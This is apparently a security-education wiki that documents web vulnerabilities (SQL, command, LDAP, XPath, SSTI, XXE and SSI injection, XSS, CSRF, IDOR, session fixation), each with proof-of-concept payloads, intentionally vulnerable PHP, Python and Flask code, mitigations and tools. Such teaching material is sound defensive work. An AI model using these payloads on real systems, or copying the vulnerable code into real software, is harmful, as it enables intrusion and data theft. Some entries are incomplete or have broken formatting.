# 🌐 Welcome to the WebVuln- Wiki!
# WebVuln-

**WebVuln-** is a structured and practical documentation project focused on common web vulnerabilities. It includes detailed explanations, proof-of-concept demos, mitigations, testing tools, and references — making it a valuable resource for security researchers, developers, and learners.

---

## 📁 Structure

Each vulnerability is documented in a consistent format:

- **Category**
- **Vulnerability ID**
- **Description**
- **Demo / Proof of Concept**
- **Mitigation**
- **Testing Tools / Techniques**
- **References**

---

## ✅ Completed Entries

- WEBVULN-001: SQL Injection
- WEBVULN-002: Cross-Site Scripting (XSS)
- ...
- WEBVULN-030: Insecure File Handling

---

## 📚 Goals

- Document the top 100 web vulnerabilities
- Provide reproducible PoCs and demos
- Help learners understand how to identify and mitigate each issue
- Build a reference base for secure development and testing

---

## 🧪 Tools & Techniques Covered

- `burpsuite`, `zap`, `ffuf`, `dirsearch`, `sqlmap`, `xsstrike`
- Manual testing techniques
- Secure coding and configuration patterns
- Source code review tips

---

## 🚀 How to Use

1. Clone the repository:

   ```bash
   git clone https://github.com/mngugi/WebVuln-.git
   cd WebVuln-
   ```

2. Browse through markdown files grouped by vulnerability ID:

   ```bash
   less vulnerabilities/WEBVULN-001.md
   ```

---

## 🤝 Contributing

Contributions are welcome! You can help by:

- Adding new vulnerability entries
- Improving existing content or formatting
- Suggesting tools or examples

Fork the repo and open a pull request.

---

## 📄 License

This project is licensed under the MIT License.

- Documenting **100+ web vulnerabilities** with testing tools and mitigation strategies.

---

## 🧨 PART 1: INJECTION EXPLOITS

---

### 🔹 WebVuln-001: SQL Injection
---
**Category:**  
Injection

**Vulnerability ID:**  
`WEBVULN-001`

---

### 🧪 Demo / Proof of Concept (PoC)

#### 📌 Scenario:
A login form vulnerable to SQL Injection uses the following query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

Password can be anything.

✅ **Effect:**  
Bypasses authentication by always evaluating the WHERE clause as true.

---

🌐 **PoC Platforms:**  
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

🛡️ **Mitigation**  
✅ Use prepared statements / parameterized queries (e.g., `mysqli`, `PDO` in PHP)  
✅ Use ORM frameworks that handle escaping automatically  
✅ Enforce strict input validation and whitelisting  
✅ Disable detailed SQL error messages in production environments

---

🔧 **Testing Tools / Techniques**  
- sqlmap  
- Burp Suite (Community / Pro)  
- OWASP ZAP  
- Manual testing using known payloads

---

📚 **References**  
- OWASP SQL Injection  
- PortSwigger: SQL Injection  
- OWASP Cheat Sheet: SQL Injection Prevention


***

## WEBVULN-002: Cross-Site Scripting (XSS)

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into content served to other users. It can lead to session hijacking, defacement, or redirection to malicious sites.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A search field reflects input directly back into the HTML without sanitization:

```html
<p>You searched for: <?php echo $_GET['q']; ?></p>

```
### ✅ Result
The script executes in the user's browser, demonstrating a reflected XSS.

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [XSS Game by Google](https://xss-game.appspot.com/)

---

### 🔒 Mitigation

- Escape output using appropriate HTML entity encoding
- Use Content Security Policy (CSP)
- Sanitize input on the server and client side
- Prefer safe frameworks that auto-sanitize (e.g., React, Angular)
- Avoid `innerHTML`, `document.write`, and inline event handlers

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite**
- **OWASP ZAP**
- **XSS Hunter** (for stored XSS tracking)
- Manual payloads:
  ```html
  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>

***

## WEBVULN-003: Cross-Site Request Forgery (CSRF)

### 🗂️ Category
Broken Authentication / Session Management

### ⚠️ Vulnerability Overview
Cross-Site Request Forgery (CSRF) tricks a logged-in user into executing unwanted actions on a web application where they’re authenticated. Exploits rely on the user's browser automatically including session cookies.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A vulnerable banking app allows fund transfers via a simple GET request:

`http://vulnerable-bank.com/transfer?amount=1000&to=attacker_account`

If the user is authenticated, this request will succeed.

**Attack Example:**  
An attacker can embed this into an image or hidden form on a malicious website:

```html
<img src="http://vulnerable-bank.com/transfer?amount=1000&to=attacker_account">

```
### Result:


If a logged-in user visits the attacker’s page, the browser sends the request with session cookies — and funds get transferred without the user’s knowledge.

***

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [WebGoat](https://owasp.org/www-project-webgoat/)

---

### 🔒 Mitigation

- Use anti-CSRF tokens (e.g., synchronizer tokens, double submit cookies)
- Validate `Origin` and `Referer` headers
- Use the `SameSite` cookie attribute (`SameSite=Lax` or `SameSite=Strict`)
- Require re-authentication or CAPTCHA for sensitive operations
- Avoid using GET for state-changing actions

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Pro** (includes CSRF PoC generator)
- **OWASP ZAP**
- Manual testing using crafted HTML forms or `curl`
- Check for missing CSRF tokens in sensitive POST requests

---

### 📚 References

- [OWASP CSRF Page](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

***
## WEBVULN-004: Remote Code Execution (RCE)

### 🗂️ Category
Injection / Critical

### ⚠️ Vulnerability Overview
Remote Code Execution (RCE) allows an attacker to execute arbitrary system-level code on the target server. This is one of the most dangerous vulnerabilities, often leading to full system compromise, lateral movement, and persistence.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A web application allows users to ping a host:

```php
<?php
$host = $_GET['host'];
echo shell_exec("ping -c 1 " . $host);
?>

```
---
**Malicious Input:**


`127.0.0.1; whoami`

**Result:**

The command runs ping, then executes whoami, returning the server's current user.

**Alternative PoC Payloads:**

Linux:

`127.0.0.1; ls /`

Windows:

`127.0.0.1 & dir`

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub – RCE Labs](https://github.com/vulhub/vulhub)

---

### 🔒 Mitigation

- Never pass user input directly to system calls or `eval()` functions
- Use allowlists to strictly validate and sanitize inputs
- Avoid dangerous functions: `eval()`, `exec()`, `shell_exec()`, `popen()`, etc.
- Run applications with least privileges (non-root where possible)
- Use Web Application Firewalls (WAFs) for added detection and protection

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Intruder**
- **Metasploit Framework**
- **Commix** (for command injection automation)
- Manual fuzzing with OS-specific payloads
- Monitor logs and output for signs of command execution

---

### 📚 References

- [OWASP RCE Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger RCE](https://portswigger.net/web-security/os-command-injection)
- [GTFOBins](https://gtfobins.github.io/) — post-exploitation techniques


***
## WEBVULN-005: Command Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
Command Injection occurs when user input is passed directly to a system shell or command interpreter without proper sanitization. This allows attackers to execute arbitrary commands on the host system, potentially leading to full server compromise.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A web app provides a functionality to check server reachability:

```php
<?php
$ip = $_GET['ip'];
echo shell_exec("ping -c 1 " . $ip);
?>

```
---

**Malicious Input:**

`127.0.0.1; uname -a`

**Result:**

- Executes ping, then `uname -a`, leaking system info.

**PoC Payloads:**

**Linux:**

```
127.0.0.1; id
127.0.0.1 && cat /etc/passwd
```
**Windows:**

```
127.0.0.1 & whoami
127.0.0.1 | dir
```

***
### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub – Command Injection Labs](https://github.com/vulhub/vulhub/tree/master/command-injection)

---

### 🔒 Mitigation

- Avoid executing system commands with user input
- Use safe APIs that don’t involve shell invocation
- Implement strict input validation and allowlists
- Escape shell metacharacters if shell execution is unavoidable
- Apply least privilege principles on server processes

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Repeater/Intruder**
- **Commix** (automated command injection)
- **Metasploit Framework**
- Manual testing with OS-specific payloads
- Monitor system command logs and anomalies

---

### 📚 References

- [OWASP Command Injection Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
- [GTFOBins](https://gtfobins.github.io/) — for command abuse post-exploitation


***

## WEBVULN-006: Insecure Direct Object Reference (IDOR)

### 🗂️ Category
Broken Access Control

### ⚠️ Vulnerability Overview
IDOR occurs when an application exposes internal object references (like IDs, filenames, or usernames) without proper access control checks. Attackers can manipulate these references to access unauthorized data or functions.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A user profile is accessed via:

---
`GET /profile?user_id=1001`

- Changing the `user_id` to another value (e.g., `1002`) reveals another user's profile:

`GET /profile?user_id=1002`


**Result:**  
Sensitive information is disclosed due to missing authorization checks.

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

### 🔒 Mitigation

- Enforce access control checks server-side for every resource
- Do not expose predictable object references (use UUIDs or indirect mapping)
- Avoid relying on client-side authorization
- Log and monitor unauthorized access attempts

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite** (manual ID tampering)
- **Postman** or custom scripts for API fuzzing
- Review server logs for abnormal ID access patterns
- Automated tools (e.g., **Autorize** Burp plugin)

---

### 📚 References

- [OWASP IDOR Guide](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)
- [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)
- [OWASP Top 10: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---
## WEBVULN-007: XML Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
XML Injection occurs when user input is inserted into an XML document or query without proper sanitization. This can lead to data manipulation, authentication bypass, or even denial of service. It’s commonly seen in SOAP-based services or applications parsing XML.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A login system accepts XML-based input:

```xml
<user>
    <username>admin</username>
    <password>admin</password>
</user>

```
---

Result:
The attacker bypasses authentication if the XML is used in backend XPath or SQL queries without sanitization.

Other Payloads:

```xml

<user><name>John</name><role>admin</role></user>

```
- Insert additional nodes
- Modify structure of parsed XML
- Exploit backend processing logic

---

### 🧪 Test Environment

- [bWAPP](http://www.itsecgames.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- Custom SOAP/XML-based test APIs

---

### 🔒 Mitigation

- Always sanitize and encode user input before inserting into XML
- Use secure XML parsers with entity resolution disabled
- Apply schema validation (XSD) for expected structure
- Avoid string concatenation when building XML
- Enable logging and anomaly detection for malformed XML inputs

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite** (modify XML requests)
- **SOAPUI** for testing SOAP/XML APIs
- Manual injection with crafted XML payloads
- Look for unauthenticated access, malformed parsing, or logic bypass

---

### 📚 References

- [OWASP XML Injection Guide](https://owasp.org/www-community/attacks/XML_Injection)
- [PortSwigger XML Injection](https://portswigger.net/web-security/xml-injection)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---
## WEBVULN-008: LDAP Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
LDAP Injection occurs when untrusted user input is embedded into an LDAP query without proper sanitization. Attackers can manipulate LDAP filters to bypass authentication, escalate privileges, or extract sensitive directory data.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A login form uses LDAP to authenticate:

```java
String ldapFilter = "(uid=" + user + ")";
```
**Malicious Input:**

```
Username: *)(uid=*

```

**Result:**
- LDAP filter becomes:

```
(uid=*)(uid=*)

```
- This can match all users and allow login bypass or unauthorized access.

**Other Payloads:**

- Authentication Bypass:

```
admin*)(userPassword=*
Privilege Escalation:
```
```
*)(|(admin=*))(
```
---
### 🧪 Test Environment

- [bWAPP](http://www.itsecgames.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- Custom apps with OpenLDAP backend

---

### 🔒 Mitigation

- Sanitize and validate all user input before including it in LDAP queries
- Use parameterized LDAP queries (e.g., with JNDI, .NET DirectoryServices)
- Apply allowlists for input fields (e.g., usernames, emails)
- Escape special characters in LDAP queries: `()|&!*=\<>~`

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite**
- Manual testing with crafted LDAP filter payloads
- Inspect backend logs for suspicious filter manipulation
- Use fuzzing to detect filter anomalies

---

### 📚 References

- [OWASP LDAP Injection Guide](https://owasp.org/www-community/attacks/LDAP_Injection)
- [PortSwigger LDAP Injection](https://portswigger.net/web-security/ldap-injection)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)


***
## 🛡️ WEBVULN-009: XPath Injection

- **Category:** Injection  
- **Vulnerability ID:** WEBVULN-009  
- **Name:** XPath Injection  

---

### 🔍 Description
**XPath Injection** occurs when user-controlled input is unsafely embedded into XPath queries used to retrieve or manipulate data from XML documents. This allows attackers to alter the structure of the query, potentially bypassing authentication, accessing unauthorized data, or triggering denial of service.

---

### 🧪 Example / Proof of Concept

#### Vulnerable Code (PHP Example):
```php
$username = $_POST['username'];
$password = $_POST['password'];

$xml = simplexml_load_file('users.xml');
$result = $xml->xpath("//user[username/text()='$username' and password/text()='$password']");
```
---

**Attack Payload:**
```
Username: ' or '1'='1
Password: ' or '1'='1

```
**Resulting XPath:**
```
//user[username/text()='' or '1'='1' and password/text()='' or '1'='1']

```
- This always evaluates to true, allowing an attacker to bypass authentication.

### 🛡️ Mitigation

- **Input Validation & Escaping**: Always sanitize and escape user input to avoid breaking out of query structure.
- **Parameterized Queries**: Use libraries that support parameterized XPath expressions to prevent injection.
- **Avoid XML for Authentication**: Prefer secure, database-backed authentication systems where possible.
- **Least Privilege**: Ensure XML files and applications accessing them follow the principle of least privilege.

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Try injecting XPath payloads into fields used in XML queries.
- **Burp Suite**: Intercept and modify XML requests.
- **OWASP ZAP**: Scan for XML/XPath injection points.
- **FuzzDB**: Use known XPath injection payloads for fuzzing.

---

### 📚 References

- [OWASP: XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: XPath Injection](https://portswigger.net/web-security/xpath-injection)

---
## WEBVULN-010: HTML Injection

- **Category:** Injection  
- **Vulnerability ID:** WEBVULN-010  
- **Name:** HTML Injection  

---

### 🔍 Description

**HTML Injection** is a type of injection attack where malicious HTML code is inserted into a web page. If the application improperly handles or sanitizes user input, an attacker can manipulate the content or structure of the page — potentially leading to content spoofing, redirection, or even client-side script execution in some cases.

While similar to Cross-Site Scripting (XSS), **HTML Injection** focuses on injecting HTML **without JavaScript execution**, often for defacement, phishing, or UI redressing.

---

### 🧪 Example / Proof of Concept

#### Vulnerable Code (PHP Example):
```php
$name = $_GET['name'];
echo "<p>Welcome, $name!</p>";
```
**Attack Payload:**

`<script>alert('Injected!')</script>

**Rendered Result:**

`<p>Welcome, <script>alert('Injected!')</script>!</p>`
- If output is not properly encoded, this executes a script (XSS), or at minimum injects unwanted HTML.

---

### 🛡️ Mitigation

- **Output Encoding**: Use proper output encoding (e.g., `htmlspecialchars()` in PHP) when displaying user input.
- **Input Validation**: Reject or sanitize input containing HTML tags unless explicitly intended.
- **Content Security Policy (CSP)**: Implement CSP headers to mitigate the risk of HTML/JS being misused in the browser.
- **Framework Defaults**: Use frameworks that automatically escape output (e.g., Django, Rails, React).

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Inject simple HTML tags like `<b>`, `<i>`, `<h1>`, or `<img src=x onerror=alert(1)>` to observe behavior.
- **Burp Suite**: Intercept and modify inputs; view response rendering.
- **OWASP ZAP**: Perform automated scanning to detect HTML injection vulnerabilities.
- **Browser DevTools**: Inspect rendered HTML and DOM for unexpected elements.

---

### 📚 References

- [OWASP: HTML Injection](https://owasp.org/www-community/attacks/HTML_Injection)
- [PortSwigger: HTML Injection](https://portswigger.net/web-security/html-injection)

***

## 🛡️ WEBVULN-011: Open Redirect

- **Category:** Validation & Redirects  
- **Vulnerability ID:** WEBVULN-011  
- **Name:** Open Redirect

---

### 🔍 Description

**Open Redirect** occurs when a web application allows untrusted input to control the URL to which a user is redirected after clicking a link or submitting a form. This can be exploited by attackers to redirect victims to malicious sites — often used in phishing or malware distribution.

---

### 🧪 Example / Proof of Concept

#### Vulnerable URL:

---

#### Exploit:
An attacker can send a user the following URL:
---

If the site blindly redirects to `url`, the user is taken to a malicious destination while thinking they're interacting with a trusted domain.

---

### 🛡️ Mitigation

- **Allowlist URLs**: Only allow redirects to trusted domains or specific internal paths.
- **Validate & Sanitize Input**: Block full URLs and only allow relative paths where possible.
- **Display Warning Pages**: Inform users when they are being redirected off-site.
- **Avoid External Redirects**: Where possible, avoid user-controlled redirection entirely.

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Modify `redirect`, `url`, or `next` parameters with external links.
- **Burp Suite**: Intercept requests and test for open redirect behavior.
- **OWASP ZAP**: Scan for open redirect issues using the automated scanner.
- **Payloads**:

---

---

### 📚 References

- [OWASP: Open Redirect](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards)
- [PortSwigger: Open Redirect](https://portswigger.net/web-security/open-redirect)

---

## WEBVULN-012: XML External Entity (XXE) Injection

### 🧠 Description
XXE occurs when an XML input containing a reference to an external entity is processed by a weakly configured XML parser. This can lead to:

- Disclosure of internal files
- Server-side request forgery (SSRF)
- Denial of Service (DoS)
- Remote code execution (in extreme cases)

### 🚨 Example Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
### 🛡️ Mitigation
- **Disable External Entities**: Configure your XML parsers to disallow `DOCTYPE` declarations and external entities.
- **Use Secure Parsers**: Prefer libraries with secure-by-default configurations (e.g., `defusedxml` in Python).
- **Input Validation**: Validate and sanitize XML input from untrusted sources.
- **Limit Permissions**: Restrict file system and network access from XML parsers whenever possible.

### 🧰 Testing Tools / Techniques
- **Manual Payload Injection**: Insert external entity definitions and monitor server behavior.
- **Burp Suite**: Use the XXE plugin or manually inject XXE payloads in intercepted requests.
- **OWASP ZAP**: Automated scanners can identify some XXE vulnerabilities.
- **XXEinjector**: A specialized tool for exploiting XXE vulnerabilities.

### 📚 References
- [OWASP: XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: XXE Injection](https://portswigger.net/web-security/xxe)

---
***


## WEBVULN-013: Server-Side Includes (SSI) Injection

### 🧠 Description
SSI injection occurs when user input is embedded in files that are parsed by the web server for Server Side Includes (SSI). If the input is not properly sanitized, attackers can inject SSI directives that get executed by the server, leading to:

- Execution of arbitrary commands
- Disclosure of sensitive files
- Unauthorized access or data manipulation

This vulnerability typically affects older or misconfigured servers like Apache with `mod_include` enabled.

### 🚨 Example Payloads

Injecting SSI code into a vulnerable field:

```html
<!--#exec cmd="ls"-->
```
---
### ⚠️ Real-World Impact
- Gaining access to sensitive system files  
- Running arbitrary shell commands on the server  
- Leveraging for further attacks like privilege escalation  

---

### 🛡️ Mitigation
- **Disable SSI**: If not required, turn off SSI processing in your web server configuration.
- **Sanitize Input**: Properly validate and sanitize all user input to avoid injection into SSI-parsed files.
- **Use HTTP Headers**: Set `X-Content-Type-Options: nosniff` and related headers to reduce abuse.
- **Use Safer Templating**: Avoid legacy templating mechanisms that rely on SSI.

---

### 🧰 Testing Tools / Techniques
- **Manual Injection**: Inject known SSI payloads (`<!--#exec cmd="id"-->`) and observe the output.
- **Burp Suite**: Modify requests to test for reflected SSI behavior.
- **OWASP ZAP**: Scan for potential injection vectors.
- **Logs**: Check server logs for unexpected command execution patterns.

---

### 📚 References
- [OWASP: SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)  
- [PortSwigger: SSI Injection](https://portswigger.net/web-security/ssrf)  
- [Apache SSI Guide](https://httpd.apache.org/docs/current/howto/ssi.html)
---
***
## WEBVULN-014: HTTP Response Splitting

### 🧠 Description
HTTP Response Splitting is a vulnerability that arises when user-supplied data is included in HTTP headers without proper sanitization. By injecting CRLF (carriage return `\r` and line feed `\n`) characters, attackers can manipulate the structure of the HTTP response, potentially:

- Injecting malicious headers
- Triggering cross-site scripting (XSS)
- Redirecting users
- Performing cache poisoning

---

### 💥 Example Payloads

Injected input:
`%0d%0aSet-Cookie: session=attacker`

`When reflected in a vulnerable header (e.g., `Location`, `Set-Cookie`), this can split the response: `

`HTTP/1.1 302 Found Location: /somepath Set-Cookie: session=attacker `

---

### ⚠️ Real-World Impact
- Cookie manipulation
- HTTP header injection
- XSS through crafted responses
- Cache poisoning and phishing

---

### 🛡️ Mitigation
- **Input Validation**: Strip or encode CR (`\r`) and LF (`\n`) characters from user inputs used in HTTP headers.
- **Use Frameworks**: Leverage secure web frameworks that automatically sanitize headers.
- **Avoid Direct Header Manipulation**: Always validate and encode user input before using it in `Location`, `Set-Cookie`, etc.
- **Security Libraries**: Use libraries with strict header handling.

---

### 🧰 Testing Tools / Techniques
- **Manual Testing**: Try injecting `%0d%0a` into inputs reflected in headers.
- **Burp Suite**: Modify HTTP request headers to observe response manipulation.
- **OWASP ZAP**: Automated detection of header-based injections.
- **Fuzzing**: Use payloads with CRLF characters in fuzzing tools.

---

### 📚 References
- [OWASP: HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)  
- [PortSwigger: HTTP Response Splitting](https://portswigger.net/web-security/response-splitting)

***

### 🛡️ WEBVULN-015: OS Command Injection

🔹 Category
Injection

### 🆔 Vulnerability ID
**WEBVULN-015**

🧪 Demo / Proof of Concept (PoC)
✅ Example 1: Vulnerable Python Code (using os.system)
```python

import os
user_input = input("Enter filename: ")
os.system(f"ls {user_input}")

```
Exploit:


`Input: ; whoami`
Result: Executes `ls ; whoami`

✅ Example 2: Vulnerable PHP Code
```php

<?php
$cmd = $_GET['cmd'];
system("ping -c 1 " . $cmd);
?>

```
**Exploit:**


`URL: http://example.com/vuln.php?cmd=127.0.0.1;id`
`Result: Executes `ping -c 1 127.0.0.1;id``

**🛡️ Mitigation**

**✅ Safe Coding Practices**
- Avoid directly using user input in system-level commands.

- Use whitelisting, parameterized functions, or safe APIs.

- In Python, prefer subprocess.run() with list-based arguments and shell=False.

Example Fix (Python):
```
import subprocess
user_input = input("Enter filename: ")
subprocess.run(["ls", user_input], shell=False)
```
Example Fix (PHP):
```php

<?php
$allowed = ['127.0.0.1', 'localhost'];
$target = $_GET['cmd'];
if (in_array($target, $allowed)) {
    system("ping -c 1 " . escapeshellarg($target));
}
?>
```
🔧 Testing Tools / Techniques
- Burp Suite (Intruder, Repeater)

- OWASP ZAP

- Commix – Automated command injection tool

Manual Fuzzing: Use payloads like ; whoami, && ls, | id, etc.

**📚 References**
- OWASP: Command Injection

- PortSwigger: OS command injection

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)


***

### 🛡️ WEBVULN-016: Blind SQL Injection

**🔹 Category**
Injection

**🆔 Vulnerability ID**

**WEBVULN-016**

---
🧪 Demo / Proof of Concept (PoC)
✅ Example: Vulnerable PHP Code (Login Form)
```php

<?php
$user = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$user'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result)) {
    echo "User exists";
} else {
    echo "User not found";
}
?>
```
**🎯 Exploit Example (Boolean-based):**
```vbnet

Input: ' OR 1=1 -- 
Response: "User exists"
```

**🎯 Exploit Example (Blind Boolean-based):**
```vbnet

Input: ' AND 1=1 -- 
Result: Normal response
Input: ' AND 1=2 -- 

```
Result: Different response (indicating conditional logic success)

**🎯 Exploit Example (Time-based):**
```sql

Input: ' OR IF(1=1, SLEEP(5), 0) -- 

```
Response delay indicates SQL injection success.

**🛡️ Mitigation**

✅ Use Parameterized Queries / Prepared Statements
PHP (mysqli with prepared statements):
```php

$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $user);
$stmt->execute();
```
**✅ Input Validation & Escaping**
Use whitelisting for input validation.

Escape output using context-aware functions.

**✅ Least Privilege**
Ensure the database user has limited permissions.

**🔧 Testing Tools / Techniques**
Burp Suite (Repeater/Intruder with boolean and time-based payloads)

- SQLMap (automates detection and exploitation)

- Manual Injection using:

- Boolean-based payloads: ' AND 1=1 --, ' AND 1=2 --

- Time-based payloads: ' OR SLEEP(5) --

**📚 References**
- OWASP: Blind SQL Injection

- PortSwigger: Blind SQL Injection

- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

***

### 🛡️ WEBVULN-017: Server-Side Template Injection (SSTI)
🔹 Category
Injection

**🆔 Vulnerability ID**
### WEBVULN-017

**🧪 Demo / Proof of Concept (PoC)**

---

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get("name", "")
    template = f"Hello {name}!"
    return render_template_string(template)

```
---
**🎯 Exploit (Jinja2 - Flask)**
`Input: {{7*7}}`
`Result: "Hello 49!"`

---
**🎯 Malicious Payload (Remote Code Execution PoC)**
`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`

---
**🛡️ Mitigation**

**✅ Avoid render_template_string**
- Use render_template() with static templates, never dynamic template strings.

**✅ Sanitize User Input**
- Do not trust user input within templates.

- Escaping input is not enough — separate logic and presentation.

**✅ Template Sandboxing**
- Use template sandboxing if supported (e.g., Jinja2 sandbox).

- Limit access to sensitive classes or globals.

---
**🔧 Testing Tools / Techniques**

- Manual Testing using common payloads:

- `{{7*7}}`

-`{{"".__class__.__mro__[1].__subclasses__()}}`

- Burp Suite – Manual payload testing and automation

- Template-Scanner – Automated SSTI scanner

    
🔎 Common Payloads

| Payload                                                                 | Purpose              |
|-------------------------------------------------------------------------|----------------------|
| `{{7*7}}`                                                               | Arithmetic test      |
| `{{ ''.__class__ }}`                                                    | Class object access  |
| `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('id') }}` | RCE attempt|

**📚 References**
- PortSwigger: SSTI

- OWASP: SSTI

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

***
## PART II 
### Broken Authentication and Session Management

###🛡️ WEBVULN-018: Broken Authentication and Session Management (Session Fixation)
🔹 Category
- Authentication & Session Management

**🆔 Vulnerability ID**
**WEBVULN-018**

**🧪 Demo / Proof of Concept (PoC)**

---
**✅ What is Session Fixation?**

Session Fixation is a vulnerability where an attacker sets or predicts a user's session ID before they authenticate. If the session is not regenerated upon login, the attacker can hijack it once the victim logs in.

**✅ Example: Vulnerable PHP Logic**
```php

<?php
session_id($_GET['sessid']);
session_start();
// ... user logs in ...
?>
```
**🎯 Attack Flow:**
Attacker sends victim a link:
`https://example.com/login.php?sessid=abc123`

- Victim logs in with session ID abc123

- Attacker reuses the same session ID to impersonate the victim

**🛡️ Mitigation**
**✅ Regenerate Session ID After Login**
```php

<?php
session_start();
// after successful authentication
session_regenerate_id(true);
```
---

### ✅ Set Secure Session Attributes

- Use `HttpOnly`, `Secure`, and `SameSite` cookie flags
- Set short session expiration times
- Avoid exposing `session_id` via URLs

---

### 🔧 Testing Tools / Techniques

- **Burp Suite**:
  - Intercept and replay requests with fixed session IDs
  - Check for `Set-Cookie` header before and after login
- **OWASP ZAP**
- Manual analysis of session behavior

---

### 🔍 Indicators of Vulnerability

| Behavior                                      | Risk                        |
|-----------------------------------------------|-----------------------------|
| Session ID remains the same before/after login | High risk of session fixation |
| Session ID exposed in URL                     | High risk of hijacking      |
| No use of `session_regenerate_id()`           | Poor session handling       |

---

### 📚 References

- [OWASP: Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [OWASP Top 10 - Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger: Session Fixation](https://portswigger.net/web-security/authentication/session-fixation)


---
**🧪 Hands-On: Session Fixation Demo**

**🧰 Requirements**
- Python 3

- Flask

- Browser

- Burp Suite (optional, for analysis)

---
**🚧 Vulnerable Flask App (for demo/testing)**

```python
# session_fixation_vuln.py
from flask import Flask, session, request, redirect, url_for, make_response

app = Flask(__name__)
app.secret_key = "super_secret_key"

@app.route('/')
def index():
    user = session.get('user')
    return f"👤 Logged in as: {user}" if user else "🔓 Not logged in"

@app.route('/set_session')
def set_session():
    session_id = request.args.get("sessid")
    resp = make_response(redirect(url_for('login')))
    if session_id:
        resp.set_cookie('session', session_id)
    return resp

@app.route('/login')
def login():
    session['user'] = "admin"
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)

```
**🧪 Exploit Steps**

- Attacker sends victim a crafted link:

```bash

http://localhost:5000/set_session?sessid=attacksessionid

```
- Victim clicks link and logs in at /login

- Session ID is reused from attacker: attacksessionid

- Attacker accesses / with the same session ID

```nginx

curl -b "session=attacksessionid" http://localhost:5000/

```

**🎯 Gets access to the authenticated session!**

**🛡️ Fix (in Flask)**
-Replace this line inside /login route:

```python

session['user'] = "admin"

```
- With a secure version that regenerates the session:

```python

from flask import session
session.clear()
session['user'] = "admin"
Optionally rotate the session cookie with:
```

```python

@app.before_request
def make_session_permanent():
    session.permanent = True
```
---

**🧪 Analyze with Burp Suite**
- Intercept login requests.

- Compare session cookies before and after login.

